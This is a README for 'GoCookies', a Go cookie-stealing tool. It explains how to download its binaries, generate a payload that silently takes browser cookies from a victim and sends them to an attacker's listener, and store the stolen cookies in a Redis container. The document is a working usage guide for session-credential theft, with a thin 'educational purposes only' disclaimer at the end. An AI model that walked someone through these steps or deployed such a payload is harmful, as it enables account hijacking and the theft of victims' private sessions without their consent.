

# GoCookies - A Browser Cookie Stealer Written in Go

GoCookies is a tool for stealing cookies from a victim's browser and sending them to an attacker's machine. It is written in Go and has three components: `gocookies`, `gocookies-generate`, and `gocookies-listener`.

The `gocookies-generate` component generates a payload that can be sent to the victim. This payload steals the cookies from the victim's browser and sends them to the `gocookies-listener` component running on the attacker's machine. The `gocookies-listener` component receives the cookies and stores them in a Redis database running in a Docker container.

## Prerequisites

Before using GoCookies, you will need to have the following installed:

- Docker
- Go
- Git

## Getting Started

To get started with GoCookies, follow these steps:

1. Clone the repository:

```
git clone https://github.com/simonfalke-01/gocookies.git
```

2. Download the latest release:

For Linux:
```
curl https://github.com/simonfalke-01/gocookies/releases/latest/download/generate-linux -o generate && curl https://github.com/simonfalke-01/gocookies/releases/latest/download/listener-linux -o listener && chmod +x generate listener
```

For macOS:
```
curl https://github.com/simonfalke-01/gocookies/releases/latest/download/generate-macos -o generate && curl https://github.com/simonfalke-01/gocookies/releases/latest/download/listener-macos -o listener && chmod +x generate listener
```

For Windows:  
Idk if it even works.

Alternatively, you can download the binaries manually from the [releases](https://github.com/simonfalke-01/gocookies/releases/latest/) page.

## Generating a Payload

To generate a payload, use the `gocookies-generate` component. This component requires the following arguments:

- `-h` - The host of the listener.
- `-p` - The port of the listener.
- `-d` - The path of the `gocookies` directory.
- `-v` (optional) - Whether to print verbose output (by default, the payload does not print any output).

Example:

```
./generate -h localhost -p 8091 -d ~/gocookies/gocookies
```

Here, `~/gocookies` is the cloned repository.

Once the payload is generated, you can send it to the victim.

## Setting up the Listener

Before running the listener, ensure that the docker daemon is running. Then, pull the `redis` image:

```
docker image pull redis:alpine3.18
```

To set up the listener, use the `gocookies-listener` component. This component requires the following arguments:

- `-r` - The port on which Redis will be running.
- `-p` - The port on which the listener will be running.
- `-e` (optional) - Whether to use an existing Redis container (if not specified, a new Redis container will be created). If specified, `-r` will be the port of the existing Redis container.

Example:

```
./listener -r 8090 -p 8091
```

Once the listener is set up, you can wait for the victim to connect to it and send the cookies.

## Building from Source

To build `gocookies-generate` from source, navigate to the `gocookies-generate` directory and run:

```
go build
```

To build `gocookies-listener` from source, navigate to the `gocookies-listener` directory and run:

```
go build
```

## Disclaimer

This tool is for educational purposes only. Using this tool without the consent of the victim is illegal and unethical. The author of this tool is not responsible for any illegal or unethical use of this tool.
